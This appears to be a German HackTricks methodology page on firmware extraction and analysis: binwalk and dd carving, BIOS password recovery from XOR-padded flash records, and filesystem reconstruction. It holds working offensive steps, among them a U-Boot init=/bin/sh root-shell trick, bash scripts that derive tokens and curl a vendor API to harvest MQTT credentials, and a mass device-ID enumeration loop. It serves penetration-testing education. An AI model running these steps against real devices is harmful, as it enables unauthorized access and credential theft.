# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Informationen zur Beschaffung über zugängliche Hardware-Schnittstellen finden Sie unter [Firmware-Dump über eine UART-Konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dump](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Informationen zu einer wiederholbaren UART-Aufzeichnung während des Bootvorgangs vor dem Zugriff auf die Konsole finden Sie unter [SCPI-gesteuerte Stromversorgung und Oszilloskop-Erfassung](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den ordnungsgemäßen Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und erleichtert. Sie ist in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann, wodurch das Betriebssystem gestartet wird. Die Untersuchung und mögliche Änderung der Firmware ist ein entscheidender Schritt zum Erkennen von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

**Das Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dazu werden Daten zu folgenden Punkten erfasst:

- CPU-Architektur und verwendetes Betriebssystem
- Bootloader-Spezifikationen
- Hardware-Aufbau und Datenblätter
- Metriken zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verlauf und behördliche Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence-Tools (OSINT)** unverzichtbar, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten eine kostenlose statische Analyse, mit der potenzielle Probleme gefunden werden können.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwicklern, Herstellern)
- Durch **Erstellen** anhand der bereitgestellten Anweisungen
- Durch **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-dork**-Abfragen zum Auffinden gehosteter Firmware-Dateien
- Durch direkten Zugriff auf **Cloud-Speicher**, etwa mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Durch Abfangen von **Updates** mithilfe von Man-in-the-Middle-Techniken
- Durch **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- Durch **Mitschnitte** von Update-Anfragen innerhalb der Gerätekommunikation
- Durch Ermitteln und Verwenden von **fest codierten Update-Endpunkten**
- Durch **Dumpen** aus dem Bootloader oder über das Netzwerk
- Durch **Entfernen und Auslesen** des Speicherchips, falls alle anderen Möglichkeiten scheitern, mithilfe geeigneter Hardware-Tools

### Nur UART-Protokolle: Root-Shell über U-Boot-Umgebung im Flash erzwingen

Wenn UART RX ignoriert wird (nur Protokollausgaben), können Sie trotzdem eine Init-Shell erzwingen, indem Sie die **U-Boot-Umgebungsdaten offline bearbeiten**:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für den Blob neu**.
3. Flash nur die env-Partition erneut und starte neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, aber über externen Flash-Zugriff in die env-Partition geschrieben werden kann.

## Analysieren der Firmware

Nachdem du nun **die Firmware hast**, musst du Informationen über sie extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, prüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in der Firmware eingebettete Dateien** extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder verwende [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Rohdaten von Display-Assets im externen Flash

Ein externer SPI-Dump enthält nicht zwangsläufig die ausführbare Firmware des MCU. Vergleiche bei einem Cortex-M-Ziel den Anfang jeder möglichen Code-Region mit dem Speicherplan des Geräts: Eine normale Vektortabelle beginnt mit einem plausiblen SRAM-Stackpointer und einer Reset-Handler-Adresse im ausführbaren Speicher. Eine fehlende Vektortabelle bei Offset null beweist allein nicht, dass der gesamte Chip keinen Code enthält. Prüfe auch andere Offsets und die Boot-Anordnung. Wenn `binwalk` keinen Container findet, untersuche die Rohdaten und gleiche Flash-Leseadressen aus einer [dekodierten SPI-Aufzeichnung](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) mit Aktionen ab, die neue Bildschirme laden.<sup>[[14]](#references)</sup>

Versuche für eine Display-Asset-Region verschiedene Pixelformate und Abmessungen, statt PNG/JPEG vorauszusetzen. Beim zitierten Gerät wurden **80×160 RGB565 little-endian**-Frames verwendet: Bei zwei Bytes pro Pixel ist ein Frame **25.600 Bytes** (25 KiB) groß, nicht 24 Kilobit. Eine dekodierte Flash-Leseadresse identifizierte den Offset des Bildschirm-Assets. Der Forscher konvertierte ein vorbereitetes Bild mit `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, ersetzte das gleich große Asset im ursprünglichen Dump, schrieb es mit `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` und bestätigte das neue Bild auf dem Display. Dies zeigt, dass *externe Display-Assets* beschreibbar sind, nicht, dass sich die interne Firmware des MCU extrahieren oder neu flashen lässt. Bewahre den ursprünglichen Dump auf und überprüfe vor jedem Schreibvorgang Abmessungen, Byte-Reihenfolge, Offset und Länge des Ersatzes.<sup>[[14]](#references)</sup>

### Differentielle Flash-Analyse und wiederherstellbare XOR-Secret-Stores

Wenn das Speicherformat einer Firmware-Einstellung nicht dokumentiert ist, lies zunächst den Flash mehrmals unter gleichen Bedingungen aus, ändere **genau eine** Einstellung, erstelle erneut einen vollständigen Dump des Chips und vergleiche die Offsets. Wiederhole das Experiment mit kontrollierten Werten, um die Einstellung von Zählern und Schreibmetadaten zu unterscheiden. Änderungen an neuen Offsets statt an Ort und Stelle deuten auf einen Append-only- oder log-strukturierten Speicher hin. Bewahre gelöschte beziehungsweise tombstoned Einträge auf, da ihre Nutzdaten möglicherweise noch wiederherstellbar sind.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After dem Auffinden des Bereichs extrahieren Sie die Firmware-Module mit Tools wie `binwalk` und analysieren Sie Writer und Validator in Ghidra per Reverse Engineering. Bestätigen Sie Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung anhand des Codes, anstatt das Schema nur aus Mustern im Ciphertext abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Null-Padding wiederherstellen

Wie unter [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) beschrieben, enthüllt bekannter Klartext die Keystream-Bytes an denselben Offsets. Ein Feld fester Größe ist besonders anfällig, wenn sein Null-Padding alle Indizes eines sich wiederholenden XOR-Schlüssels abdeckt: Das verschlüsselte Padding enthüllt diese Schlüsselbytes direkt, da `0x00 XOR key_byte = key_byte` gilt. Sind alle Schlüsselindizes abgedeckt, lässt sich der Schlüssel aus dem Ende des Ciphertexts rekonstruieren und die Datenbytes entschlüsseln.<sup>[[12]](#references)</sup>

Das anfällige DVAR-BIOS-Passwortformat von Dell ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Feldes liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12`, umfassen diese Positionen jeden Schlüsselindex, sodass der vollständige Schlüssel und das Passwort ohne Brute Force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysiere nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird näherungsweise als `modified_md5(device_seed || variable_GUID || password[0])` abgeleitet: Der Geräteschlüssel und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Byte im Klartext. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppiere aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann den vollständigen Schlüssel durch Padding preisgeben und einen aktuellen, längeren Datensatz entschlüsseln, dessen Padding allein nicht ausreicht. Eine Passwortrotation kann die Gefährdung daher erhöhen, wenn alter Ciphertext tombstoned statt gelöscht wird.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann rohe gespeicherte/Schlüssel-Bytes anzeigen. Baue es aus einem Checkout und scanne ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Für benutzerdefinierte Parser lassen sich False Positives anhand der Datensatzstruktur, Einschränkungen für druckbare Zeichen, Prüfungen auf Null-Padding, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels verwerfen. Wenn wiederholte Dumps vereinzelte Bit-Flips pro Schreibvorgang zeigen, sollten die beobachteten Masken aufgelistet und mögliche Korrekturen anhand dieser Einschränkungen bewertet werden. Mehrdeutige Zeichen sollten jedoch als solche angegeben werden, statt heuristische Ergebnisse als exakte Wiederherstellung darzustellen.<sup>[[12]](#references)</sup>

Passwortverifier sollten statt reversibler Chiffretexte einen gesalzenen, iterierten Einweg-Hash speichern. Bei logstrukturierten Speichern sollten veraltete geheime Daten sicher entfernt werden.<sup>[[12]](#references)</sup>

### Dateisystem abrufen

Mit den zuvor beschriebenen Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einem **Ordner, der nach dem Dateisystemtyp benannt ist**. Üblicherweise handelt es sich um einen der folgenden Typen: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dateisystem manuell extrahieren

Manchmal enthält die Signaturdatenbank von binwalk **nicht die Magic Bytes des Dateisystems**. In solchen Fällen kannst du mit binwalk den **Offset des Dateisystems ermitteln, das komprimierte Dateisystem aus der Binärdatei ausschneiden** und das Dateisystem anschließend anhand seines Typs mit den folgenden Schritten **manuell extrahieren**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führen Sie den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem herauszulösen.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstruktion aufgeteilter eingebetteter Root-Dateisysteme

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets jedoch über die nominale Partition hinausgehen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Gerät mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen. Daher liefert das Auslesen einer einzelnen GPT-Partition nur das erste Segment.<sup>[[9]](#references)</sup>

#### Triage des vollständigen Datenträgerabbilds

Vergewissere dich zunächst, dass die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Schreibprozess das Abbild mehr geöffnet hat. Falls der Dateiname eine Start-/Endadresse enthält, vergleiche diesen Bereich mit der tatsächlichen Byteanzahl. Stelle die GPT im schreibgeschützten Modus wieder her und binde nur den erforderlichen Bereich ein. Führe **nicht** `vgchange -ay` für ein nicht vertrauenswürdiges physisches Volume auf der Workstation aus, da es zu Konflikten mit Volume-Gruppen und unbeabsichtigten Schreibvorgängen kommen kann.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwende vorzugsweise eine Wegwerf-VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das vollständige Image sehen muss. Historische Boot-Logs einer standardmäßigen Boot-Partition sind besonders nützlich: Der Bootloader könnte Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert haben. Verwende diese Werte, um eine eingebettete Kommandozeile, einen Kernel und ein initramfs herauszulösen, und überprüfe anschließend jede Ausgabe einzeln mit `file`, Magic Bytes und `binwalk`. Wenn bis zum Ende des Containers gelesen wird, können versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel angehängt werden.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung zur Bootzeit rekonstruieren

Extrahiere das initramfs des Kernels und reverse-engineere dessen `/init` sowie alle Speicherbibliotheken. Folge unter [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen für `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade; verfolge dann den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte in radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das linear target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen auf einem oder mehreren zugrunde liegenden Geräten zu. Eine rekonstruierte Tabelle mit zwei Segmenten hat häufig diese Form (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Bilde die Maschinencode-Arithmetik exakt nach, einschließlich Integerbreite, Shifts und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Bytegröße zunächst auf eine 4-KiB-Grenze ab und rechnet sie erst danach in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich das ausgewählte Ende um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ein flaches Analyse-Image lässt sich rekonstruieren, indem die Bereiche in Tabellenreihenfolge mit begrenzten Blöcken kopiert werden, statt den vollständigen Media-Dump in den Speicher zu laden. So werden auch Mapper-Geräte auf dem Host vermieden. GPT-abgeleitete Offsets, umgekehrte Sektoranzahlen und die resultierende Ausgabelänge sollten als separate Assertions geprüft werden.<sup>[[9]](#references)</sup>

#### Korruption von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS die `hsqs`-Magic und dekodiere das little-endian 64-Bit-Feld `bytes_used` am Superblock-Offset 40, bevor du `unsquashfs` ausführst. Schlägt die Extraktion in mehreren voneinander unabhängigen Strukturen fehl, durchsuche ein breites Fenster um die erwarteten Positionen und verlange aussagekräftige strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen Root-Inode, der mit der Inode-Anzahl übereinstimmt, oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dasselbe signierte Delta unabhängige Strukturen gültig macht – etwa Verzeichnis-Metadaten und einen Verity-Eintrag –, liegt die wahrscheinliche Ursache eher bei einem systematischen Fehler im Segmentstart als bei fehlenden Bytes. Kehren Sie zur umgekehrten Berechnung zurück und suchen Sie nach verworfenen Resten, Vorzeichenbehandlung, Überläufen oder Sektor-/Seitenausrichtung, bevor Sie versuchen, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halten Sie schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist. Und das Booten eines modifizierten SquashFS über ein ausschließlich für Forschungszwecke vorgesehenes init, das die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch setzt es dm-verity außer Kraft.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware vorliegt, muss sie unbedingt untersucht werden, um ihren Aufbau und mögliche Schwachstellen zu verstehen. Dazu werden verschiedene Tools verwendet, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Tools für die Erstanalyse

Für eine erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu erkennen, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf eine mögliche Verschlüsselung oder Komprimierung schließen lässt.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem in der Regel extrahieren, oft in ein Verzeichnis, dessen Name dem Dateisystemtyp entspricht (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dabei wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgelöst:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerkdienste, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und -Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Sicherheitslücken
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Verschiedene Tools helfen dabei, sensible Informationen und Sicherheitslücken im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) zur umfassenden Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) zur statischen und dynamischen Analyse

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl der im Dateisystem gefundene Quellcode als auch die kompilierten Binärdateien müssen auf Sicherheitslücken untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens auslesen

Viele IoT-Hubs rufen die gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal aus der Geräte-ID und einem fest codierten geheimen Schlüssel abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hexadezimalwert in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen. Dabei werden häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Protokolle mitschneiden:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Config-Pfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Anmeldedaten sammeln

- Stelle die URL zusammen und lade das JSON mit curl herunter; parse es mit jq, um Geheimnisse zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs missbrauchen (falls vorhanden)

- Mit wiederhergestellten Anmeldedaten Wartungs-Topics abonnieren und nach sensiblen Ereignissen suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs enumerieren (in großem Umfang, mit Autorisierung)

- Viele Ökosysteme betten Vendor-OUI-/Produkt-/Typ-Bytes ein, gefolgt von einem sequenziellen Suffix.
- Du kannst Kandidaten-IDs durchlaufen, Tokens ableiten und Configs programmgesteuert abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit einer Mass Enumeration beginnst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen. Das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, etwa einen Raspberry Pi, oder auf eine vorkonfigurierte virtuelle Maschine kann jedoch weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Um einzelne Programme zu untersuchen, müssen ihre Endianness und CPU-Architektur ermittelt werden.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für die MIPS-Architektur zu emulieren, kannst du den folgenden Befehl verwenden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien ist der Prozess ähnlich; zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion geteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, die Offsets für Inodes, Verzeichnisse oder Fragmenttabellen jedoch unmöglich sind, sollte `unsquashfs` nicht sofort gepatcht werden. Analysieren Sie stattdessen die frühe Boot-Binärdatei zurück und reproduzieren Sie den Blockgeräte-Graphen, den sie erstellt: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem aber mit einem `dm-linear`-Mapping erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle späteren Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Übernehmen Sie die Arithmetik der Firmware exakt. Stellen Sie insbesondere fest, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; reproduzieren Sie Shifts und Abschneidungen in ihrer ursprünglichen Reihenfolge; und berücksichtigen Sie bankabhängige Endbereiche in A/B-Layouts. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobyte verschieben und alle nachgelagerten SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

Ein sinnvoller Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermitteln Sie aus der Verifier-/Init-Binärdatei das Quellgerät, den Startsektor und die Länge jedes `dm-linear`-Segments.
